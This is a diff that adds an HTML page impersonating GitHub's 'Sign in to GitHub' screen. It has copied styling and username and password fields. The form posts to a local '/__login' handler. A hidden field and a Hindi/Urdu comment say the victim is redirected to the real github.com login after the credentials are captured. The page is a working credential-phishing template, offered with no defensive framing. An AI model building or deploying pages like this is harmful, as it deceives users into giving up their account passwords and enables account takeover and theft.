@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Sign in to GitHub · GitHub</title>
+<style>
+  body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif; background:#f6f8fa; margin:0; color:#1f2328; }
+  .wrap { max-width:340px; margin:60px auto; text-align:center; }
+  .logo { font-weight:700; font-size:28px; letter-spacing:-1px; margin-bottom:16px; }
+  .card { background:#fff; border:1px solid #d0d7de; border-radius:6px; padding:16px 16px 20px; text-align:left; }
+  .card h1 { font-size:16px; font-weight:400; text-align:center; margin:0 0 16px; }
+  label { font-size:14px; font-weight:600; display:block; margin:8px 0 4px; }
+  input { width:100%; padding:5px 12px; border:1px solid #d0d7de; border-radius:6px; box-sizing:border-box; font-size:14px; line-height:20px; background:#fff; }
+  input:focus { border-color:#0969da; outline:none; box-shadow:0 0 0 3px rgba(9,105,218,.3); }
+  button { margin-top:16px; width:100%; background:#1f883d; color:#fff; border:0; border-radius:6px; padding:6px 12px; font-size:14px; font-weight:600; cursor:pointer; }
+  button:hover { background:#1a7f37; }
+  .pass-row { display:flex; justify-content:space-between; align-items:baseline; }
+  .pass-row a { font-size:12px; text-decoration:none; color:#0969da; }
+  .foot { margin-top:16px; font-size:12px; color:#57606a; }
+  .foot a { color:#0969da; text-decoration:none; }
+</style>
+</head>
+<body>
+<div class="wrap">
+  <div class="logo">GitHub</div>
+  <div class="card">
+    <h1>Sign in to GitHub</h1>
+    <!-- __orig_action = asli site jahan redirect hoga capture ke baad -->
+    <form method="POST" action="/__login">
+      <input type="hidden" name="__orig_action" value="https://github.com/login">
+      <label for="login_field">Username or email address</label>
+      <input type="text" id="login_field" name="login" autocapitalize="none" spellcheck="false" required>
+      <div class="pass-row">
+        <label for="password_field">Password</label>
+        <a href="#">Forgot password?</a>
+      </div>
+      <input type="password" id="password_field" name="password" required>
+      <button type="submit">Sign in</button>
+    </form>
+  </div>
+  <div class="foot">
+    New to GitHub? <a href="#">Create an account</a><br>
+    <a href="#">Terms</a> · <a href="#">Privacy</a> · <a href="#">Docs</a>
+  </div>
+</div>
+</body>
+</html>
+
